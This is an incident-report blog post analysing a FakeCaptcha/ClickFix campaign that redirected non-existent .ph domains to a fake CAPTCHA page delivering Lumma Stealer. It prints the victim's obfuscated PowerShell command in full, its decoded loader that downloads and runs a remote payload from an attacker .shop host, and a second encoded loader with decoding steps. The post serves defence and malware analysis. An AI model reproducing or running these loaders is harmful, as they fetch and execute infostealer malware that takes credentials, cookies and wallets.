---
title: "Redirection of Non-Existent .ph and .com.ph Domains"
date: 2026-06-13
description: "An incident report on the FakeCaptcha/ClickFix campaign abusing non-existent .ph domains to deliver Lumma Stealer via a fake CAPTCHA page."
author: "drewbyte"
draft: false
---

*Originally published on [iamdrewbyte.github.io](https://iamdrewbyte.github.io/posts/irreport/)*

This report covers the Infostealer campaign known as the FakeCaptcha/Click-Fix Campaign.

## Background

On March 4, 2025, an alert was triggered after a suspicious PowerShell script ran on a user’s machine. The security team promptly contacted the affected user, who confirmed they had not executed any such script.

Further investigation revealed an obfuscated script encoded using XOR encryption. Security analysts decrypted it using publicly available tools and found several malicious URLs embedded within.

The script was linked to Lumma Stealer, an infostealer designed to exfiltrate sensitive information. The infection vector traced back to a deceptive CAPTCHA page, which the user mistook as legitimate and followed its instructions, triggering the malicious script.

This incident is part of the broader Click-Fix social engineering campaign, which tricks users into executing malware under the guise of system fixes or CAPTCHA verification.

![](/images/articles/prt/flow.png)

## Technical Findings

The script was obfuscated with XOR encryption to evade detection. Once decrypted, it revealed embedded URLs used to deliver the Lumma Stealer payload. Such obfuscation is commonly employed by malware authors to hide malicious intent from both security tools and analysts.

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w 1 -exec unrestricted -nop -C "$DpSR=[System.String]::Concat(((53,57,36,120,61,48,48,97,123,41,47,53,50,59,124,15,37,47,40,57,49,103,41,47,53,50,59,124,15,37,47,40,57,49,114,14,41,50,40,53,49,57,114,21,50,40,57,46,51,44,15,57,46,42,53,63,57,47,103,44,41,62,48,53,63,124,47,40,61,40,53,63,124,63,48,61,47,47,124,23,57,46,50,57,48,111,110,39,7,24,48,48,21,49,44,51,46,40,116,126,55,57,46,50,57,48,111,110,114,56,48,48,126,117,1,44,41,62,48,53,63,124,47,40,61,40,53,63,124,57,36,40,57,46,50,124,21,50,40,12,40,46,124,16,51,61,56,16,53,62,46,61,46,37,116,47,40,46,53,50,59,124,48,44,26,53,48,57,18,61,49,57,117,103,7,24,48,48,21,49,44,51,46,40,116,126,55,57,46,50,57,48,111,110,114,56,48,48,126,117,1,44,41,62,48,53,63,124,47,40,61,40,53,63,124,57,36,40,57,46,50,124,21,50,40,12,40,46,124,27,57,40,12,46,51,63,29,56,56,46,57,47,47,116,21,50,40,12,40,46,124,52,17,51,56,41,48,57,112,47,40,46,53,50,59,124,44,46,51,63,18,61,49,57,117,103,33,44,41,62,48,53,63,124,63,48,61,47,47,124,24,21,50,42,51,55,57,9,47,57,46,111,110,39,7,15,40,46,41,63,40,16,61,37,51,41,40,116,16,61,37,51,41,40,23,53,50,56,114,15,57,45,41,57,50,40,53,61,48,117,1,44,41,62,48,53,63,124,47,40,46,41,63,40,124,12,19,21,18,8,39,44,41,62,48,53,63,124,53,50,40,124,4,103,44,41,62,48,53,63,124,53,50,40,124,5,103,33,7,9,50,49,61,50,61,59,57,56,26,41,50,63,40,53,51,50,12,51,53,50,40,57,46,116,31,61,48,48,53,50,59,31,51,50,42,57,50,40,53,51,50,114,11,53,50,61,44,53,117,1,44,41,62,48,53,63,124,56,57,48,57,59,61,40,57,124,62,51,51,48,124,26,50,27,57,40,31,41,46,47,51,46,12,51,47,116,51,41,40,124,12,19,21,18,8,124,44,117,103,44,41,62,48,53,63,124,47,40,61,40,53,63,124,62,51,51,48,124,24,37,50,27,57,40,31,41,46,47,51,46,12,51,47,116,21,50,40,12,40,46,124,58,44,40,46,112,51,41,40,124,12,19,21,18,8,124,44,117,39,42,61,46,124,56,59,97,116,26,50,27,57,40,31,41,46,47,51,46,12,51,47,117,17,61,46,47,52,61,48,114,27,57,40,24,57,48,57,59,61,40,57,26,51,46,26,41,50,63,40,53,51,50,12,51,53,50,40,57,46,116,58,44,40,46,112,40,37,44,57,51,58,116,26,50,27,57,40,31,41,46,47,51,46,12,51,47,117,117,103,46,57,40,41,46,50,124,56,59,116,51,41,40,124,44,117,103,33,33,123,103,29,56,56,113,8,37,44,57,124,113,8,37,44,57,24,57,58,53,50,53,40,53,51,50,124,120,61,48,48,103,120,56,48,48,97,7,23,57,46,50,57,48,111,110,1,102,102,16,51,61,56,16,53,62,46,61,46,37,116,126,41,47,57,46,111,110,114,56,48,48,126,117,103,120,61,56,56,46,97,7,23,57,46,50,57,48,111,110,1,102,102,27,57,40,12,46,51,63,29,56,56,46,57,47,47,116,120,56,48,48,112,126,27,57,40,31,41,46,47,51,46,12,51,47,126,117,103,53,58,116,120,61,56,56,46,124,113,57,45,124,7,21,50,40,12,40,46,1,102,102,6,57,46,51,117,39,46,57,40,41,46,50,33,103,7,56,51,41,62,48,57,1,120,56,53,47,40,97,108,114,108,103,120,51,48,56,97,7,24,21,50,42,51,55,57,9,47,57,46,111,110,119,12,19,21,18,8,1,102,102,50,57,43,116,117,103,7,42,51,53,56,1,7,24,21,50,42,51,55,57,9,47,57,46,111,110,1,102,102,24,37,50,27,57,40,31,41,46,47,51,46,12,51,47,116,120,61,56,56,46,112,7,46,57,58,1,120,51,48,56,117,103,43,52,53,48,57,116,120,40,46,41,57,117,39,15,40,61,46,40,113,15,48,57,57,44,124,113,17,53,48,48,53,47,57,63,51,50,56,47,124,105,108,108,103,120,63,41,46,97,7,24,21,50,42,51,55,57,9,47,57,46,111,110,119,12,19,21,18,8,1,102,102,50,57,43,116,117,103,7,42,51,53,56,1,7,24,21,50,42,51,55,57,9,47,57,46,111,110,1,102,102,24,37,50,27,57,40,31,41,46,47,51,46,12,51,47,116,120,61,56,56,46,112,7,46,57,58,1,120,63,41,46,117,103,120,56,36,97,120,63,41,46,114,4,113,120,51,48,56,114,4,103,120,56,37,97,120,63,41,46,114,5,113,120,51,48,56,114,5,103,120,56,53,47,40,119,97,7,17,61,40,52,1,102,102,15,45,46,40,116,116,120,56,36,118,120,56,36,117,119,116,120,56,37,118,120,56,37,117,117,103,53,58,116,120,56,53,47,40,124,113,59,57,124,110,108,108,108,117,39,62,46,57,61,55,33,103,120,51,48,56,97,120,63,41,46,33,103,15,40,61,46,40,113,12,46,51,63,57,47,47,124,126,120,57,50,42,102,15,37,47,40,57,49,14,51,51,40,0,15,37,47,11,19,11,106,104,0,11,53,50,56,51,43,47,12,51,43,57,46,15,52,57,48,48,0,42,109,114,108,0,44,51,43,57,46,47,52,57,48,48,114,57,36,57,126,124,113,29,46,59,41,49,57,50,40,16,53,47,40,124,123,113,18,51,12,46,51,58,53,48,57,123,112,123,113,25,36,57,63,41,40,53,51,50,12,51,48,53,63,37,123,112,123,9,50,46,57,47,40,46,53,63,40,57,56,123,112,123,113,31,51,49,49,61,50,56,123,112,123,116,7,15,37,47,40,57,49,114,18,57,40,114,11,57,62,31,48,53,57,50,40,1,102,102,18,57,43,116,117,114,24,51,43,50,48,51,61,56,15,40,46,53,50,59,116,123,123,52,40,40,44,47,102,115,115,55,109,114,63,41,46,48,53,50,57,47,47,59,53,56,56,37,47,49,53,48,57,114,47,52,51,44,115,25,46,46,61,40,53,63,109,31,46,61,50,55,109,30,61,50,47,52,57,57,109,24,46,61,53,50,44,53,44,57,114,57,50,36,123,123,117,117,32,122,116,21,40,57,49,124,29,48,53,61,47,102,115,21,25,118,117,123,124,113,11,53,50,56,51,43,15,40,37,48,57,124,20,53,56,56,57,50,103,120,24,51,26,63,45,8,12,47,42,124,97,124,120,57,50,42,102,29,44,44,24,61,40,61,103,58,41,50,63,40,53,51,50,124,56,59,25,38,24,13,16,44,54,116,120,25,8,31,17,43,26,6,29,30,112,124,120,36,26,5,24,38,117,39,63,41,46,48,124,120,25,8,31,17,43,26,6,29,30,124,113,51,124,120,36,26,5,24,38,33,103,58,41,50,63,40,53,51,50,124,53,8,14,25,48,17,59,25,116,117,39,58,41,50,63,40,53,51,50,124,12,55,38,46,48,5,116,120,5,11,25,44,45,46,38,117,39,53,58,116,125,116,8,57,47,40,113,12,61,40,52,124,113,12,61,40,52,124,120,36,26,5,24,38,117,117,39,56,59,25,38,24,13,16,44,54,124,120,5,11,25,44,45,46,38,124,120,36,26,5,24,38,33,33,33,53,8,14,25,48,17,59,25,103) | % { [char]($_ -bxor 92) }));& $DpSR.Substring(0,3) $DpSR.Substring(3)"
```
 

This is the decrypted script:

```powershell
iex$all='using System;using System.Runtime.InteropServices;public static class Kernel32{[DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string lpFileName);[DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);}public class DInvokeUser32{[StructLayout(LayoutKind.Sequential)]public struct POINT{public int X;public int Y;}[UnmanagedFunctionPointer(CallingConvention.Winapi)]public delegate bool FnGetCursorPos(out POINT p);public static bool DynGetCursorPos(IntPtr fptr,out POINT p){var dg=(FnGetCursorPos)Marshal.GetDelegateForFunctionPointer(fptr,typeof(FnGetCursorPos));return dg(out p);}}';Add-Type -TypeDefinition $all;$dll=[Kernel32]::LoadLibrary("user32.dll");$addr=[Kernel32]::GetProcAddress($dll,"GetCursorPos");if($addr -eq [IntPtr]::Zero){return};[double]$dist=0.0;$old=[DInvokeUser32+POINT]::new();[void][DInvokeUser32]::DynGetCursorPos($addr,[ref]$old);while($true){Start-Sleep -Milliseconds 500;$cur=[DInvokeUser32+POINT]::new();[void][DInvokeUser32]::DynGetCursorPos($addr,[ref]$cur);$dx=$cur.X-$old.X;$dy=$cur.Y-$old.Y;$dist+=[Math]::Sqrt(($dx*$dx)+($dy*$dy));if($dist -ge 2000){break};$old=$cur};Start-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList '-NoProfile','-ExecutionPolicy','Unrestricted','-Command','([System.Net.WebClient]::New().DownloadString(''https://k1.curlinessgiddysmile.shop/Erratic1Crank1Banshee1Drainpipe.enx''))|&(Item Alias:/IE*)' -WindowStyle Hidden;$DoFcqTPsv = $env:AppData;function dgEzDQLpj($ETCMwFZAB, $xFYDz){curl $ETCMwFZAB -o $xFYDz};function iTRElMgE(){function PkzrlY($YWEpqrz){if(!(Test-Path -Path $xFYDz)){dgEzDQLpj $YWEpqrz $xFYDz}}}iTRElMgE;
```
 

![](/images/articles/prt/payloads.png)

A website containing .enx files is considered malicious as these files are often linked to encrypted, obfuscated, or potentially harmful content. Cybercriminals may use them to distribute malware, ransomware, or execute unauthorized actions on a victim’s system. Users should exercise caution, avoid downloading such files from untrusted sources, and scan them with security tools to prevent potential threats.

![](/images/articles/prt/browserh.png)

The user searched for the hrlink in the browser using Bing and noticed that it redirected multiple times until landing on a fake CAPTCHA that contained Infostealer.

```terminal
URL:
hxxps://objectstorage.ap-singapore-2.oraclecloud.com/n/ax4mqlu25efi/b/lakmewbkt/o/bidgo-loadfun-wait.html 
```
 

![](/images/articles/prt/details.png)

![](/images/articles/prt/hits.png)

This webpage hosts Infostealer, a well-known information-stealing malware designed to exfiltrate sensitive data such as login credentials, browser cookies, cryptocurrency wallets, and system information. The site is part of a malicious redirection chain, where users searching for a specific link (e.g., hrlink) are redirected multiple times before landing on a deceptive fake CAPTCHA page.

![](/images/articles/prt/correct.png)

Every non-existent domain .ph and .com.ph is entered, we are redirected to various domains, some related to cryptocurrency, gaming, and even a fake CAPTCHA that delivers Infostealer. Proof of this can be seen in the image below.

![](/images/articles/prt/nslookup.png)

The IP associated with non-existent .com.ph domains that redirect to other websites has recorded multiple hits.

![](/images/articles/prt/hits2.png)

## Malware Findings

![](/images/articles/prt/die.png)

Analysis revealed that the file Erratic1Crank1Banshee1Drainpipe.enx was not packed and was instead in plain text format.

![](/images/articles/prt/static1.png)

![](/images/articles/prt/static2.png)

The user followed the fake CAPTCHA steps as instructed, ultimately completing the attacker’s intended objective.

![](/images/articles/prt/socialengineering.png)

Attempts to replicate the attack failed as the malicious domain was already offline, preventing further testing.

![](/images/articles/prt/attempts.png)

## Conclusion

A user attempted to visit myhrlink-[XXXX].com.ph by typing it into their browser. However, since this domain does not exist, they were redirected to various directories due to the presence of bouncy.php on the server handling the request.

This redirection mechanism led them to a malicious webpage, which displayed a fake CAPTCHA prompt. Believing it to be legitimate, the user interacted with it, unknowingly executing malicious code.

As a result, they became a victim of Infostealer, an infostealer malware designed to extract sensitive data such as credentials, browser cookies, and cryptocurrency wallet information.

### How can I quickly decrypt an encrypted script?

Use the logic of a programmer when we run a script even if it is encrypted we need to see what the computer reads, Because manually decrypting a script is time consuming. If you really need to write a report faster, do this trick.

```terminal
$encrypted=[encrypted text];
$decrypted=$encrypted + [formula of encryption]; 
print($decrypted);
```
 

For example:

```powershell
$encryptedHex = 'ada1bca2b1aaa7b0adabaae487aca1a7af94b6aba7a1b7b7e4ece0a5edbfada2e4eca3b3a9ade493adaaf7f69b94b6aba7a1b7b7e4b8e4b3aca1b6a1e4bfe09bea8aa5a9a1e4e9a1b5e4e0a5b9edbf81bcadb0b9b9ffa2b1aaa7b0adabaae487aca1a7af8aa5a9a1ece0a5edbfada2ece0a5e4e9a1b5e4e081aab2fe91b7a1b68aa5a9a1edbf81bcadb0b9b9ffe0a5f5e4f9e4e6ada0a5b5eaa1bca1e6e8e6ada0a5b5f2f0eaa1bca1e6e8e6a5b1b0abb6b1aab7eaa1bca1e6e8e6a0b1a9b4a7a5b4eaa1bca1e6e8e6a0a1f0a0abb0eaa1bca1e6e8e6acababafa1bcb4a8abb6a1b6eaa1bca1e6e8e6ada8b7b4bdeaa1bca1e6e8e6a8abb6a0b4a1eaa1bca1e6e8e6a0aab7b4bdeaa1bca1e6e8e6b4a1b0ababa8b7eaa1bca1e6e8e6a5b1b0abb6b1aab7a7eaa1bca1e6e8e6b6a1b7abb1b6a7a1aca5a7afa1b6eaa1bca1e6e8e6a2ada8a1a9abaaeaa1bca1e6e8e6b6a1a3a9abaaeaa1bca1e6e8e6b4b6aba7a1bcb4eaa1bca1e6e8e6b4b6aba7a1bcb4f2f0eaa1bca1e6e8e6b0a7b4b2ada1b3eaa1bca1e6e8e6b0a7b4b2ada1b3f2f0eaa1bca1e6e8e694b6aba7a9abaaeaa1bca1e6e8e694b6aba7a9abaaf2f0eaa1bca1e6e8e6b2a9a9a5b4eaa1bca1e6e6b2a9a9a5b4f2f0eaa1bca1e6e8e6b4abb6b0a9abaaeaa1bca1e6e8e6b4b6aba7a1b7b7a8a5b7b7abeaa1bca1e6e8e693adb6a1b7aca5b6afeaa1bca1e6e8e682ada0a0a8a1b6e481b2a1b6bdb3aca1b6a1eaa1bca1e6e8e682ada0a0a8a1b6eaa1bca1e6e8e6ada0a5eaa1bca1e6e8e6ada0a5f2f0eaa1bca1e6e8e68da9a9b1aaadb0bd80a1a6b1a3a3a1b6eaa1bca1e6e8e693adaa80b1a9b4eaa1bca1e6e8e6bcf2f0a0a6a3eaa1bca1e6e8e6bcf7f6a0a6a3eaa1bca1e6e8e68ba8a8bd80a6a3eaa1bca1e6e8e694b6aba7a1b7b7e4e6e0a1aab2fe97bdb7b0a1a996ababb09897bdb7938b93f2f09893adaaa0abb3b794abb3a1b697aca1a8a898b2f5eaf498b4abb3a1b6b7aca1a8a8eaa1bca1e6e4e993adaaa0abb397b0bda8a1e48cada0a0a1aae4e985b6a3b1a9a1aab088adb7b0e4e3e9b3e3e8e3ace3e8e3e9a1b4e3e8e3e9a1b4e3e8e391aab6a1b7b0b6ada7b0a1a0e3e8e3e987aba9a9a5aaa0e3e8e69792e4f0a0fce4e3acb0b0b4b7feebeba8bdf5eaa0b6abb2a1a5a8a5b6a9a3aba5b0b7afadaaeab7acabb4eba7abaca1a8b4a1b6eab4aaa3e3ff9792e4a8f3b2e4e38aa1b0ea93a1a687a8ada1aab0e3ffb4abb4a0ff97a1b0e98db0a1a9e492a5b6ada5a6a8a1feeba993f6e4ece2ec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0eaececec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0ea94b78ba6aea1a7b0ea89a1b0acaba0b7b893aca1b6a1bfa4e09bea8aa5a9a1e9a7a8adafa1e3eea0a8eeb0e3b9edea8aa5a9a1edea8daab2abafa1ecec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0eaececec87acada8a08db0a1a9e492a5b6ada5a6a8a1feebeea7b1b0eeb0edea92a5a8b1a1ea8daab2abafa187aba9a9a5aaa0ea94b78ba6aea1a7b0ea89a1b0acaba0b7b893aca1b6a1bfa4e09bea8aa5a9a1e9a7a8adafa1e3ee87aba9eea1e3b9edea8aa5a9a1edea8daab2abafa1ece38aa1eea7b0e3e8a4e090969181e8f5ededec8392e4a8f3b2edea92a5a8b1a1edff978de492a5b6ada5a6a8a1fef5e4ecececec8392e4a993f6edea92a5a8b1a1b88389edb893aca1b6a1bfa4e09bea8aa5a9a1e9a7a8adafa1e3eeb3aaeea0eea3e3b9edea8aa5a9a1edffe2ece4ec9f97b0b6adaaa399e3e3ea8daab7a1b6b0ed9ff7f7e8f0f5e8f6f399e98eabadaae3e3edec8392e4a993f6edea92a5a8b1a1eaecec83a1b0e98db0a1a9e492a5b6ada5a6a8a1fe98f5edea92a5a8b1a1edea8daab2abafa1ecec92a5b6ada5a6a8a1e4f0a0fce4e992a5a8b1a18baaa8edede6ffe085b2be8986e4f9e4e0a1aab2fe85b4b480a5b0a5ffa2b1aaa7b0adabaae490a59d88ece080bda995b381aae8e4e08ab7aa97edbfa7b1b6a8e4e080bda995b381aae4e9abe4e08ab7aa97b9ffa2b1aaa7b0adabaae4ac89a58fb381afecedbfa2b1aaa7b0adabaae4acaf95a28fa1a9a0ece09cbe86adb68385b7edbfada2ece5ec90a1b7b0e994a5b0ace4e994a5b0ace4e08ab7aa97ededbf90a59d88e4e09cbe86adb68385b7e4e08ab7aa97b9b9b9ac89a58fb381afff'

$decryptedString = ($encryptedHex -split '(..)' | ? { $_ } | % { [char]([Convert]::ToByte($_, 16) -bxor 196) }) -join ''

$decryptedString
```
 

Now open a controlled environment where you can perform malware analysis and run the script in PowerShell.

![](/images/articles/prt/decrypted.png)

## Indicators of Compromise (IOCs)

Hash | URL  
---|---  
0ab97b928b1bf593a589ded5a5b41ad4 | hxxps[://]k1[.]curlinessgiddysmile[.]shop/Erratic1Crank1Banshee1Drainpipe[.]enx  
29b22a793f748370fd2c4c518f1439b07ff57e53 | hxxps[://]ishadowquest[.]shop/rewri[.]mp4  
00e700677b9af738305e2093f09347b90f97b75de4bb0c744c0e4fff9e4ada8d | hxxps[://]espardo[.]shop/mishtikloa[.]mp4
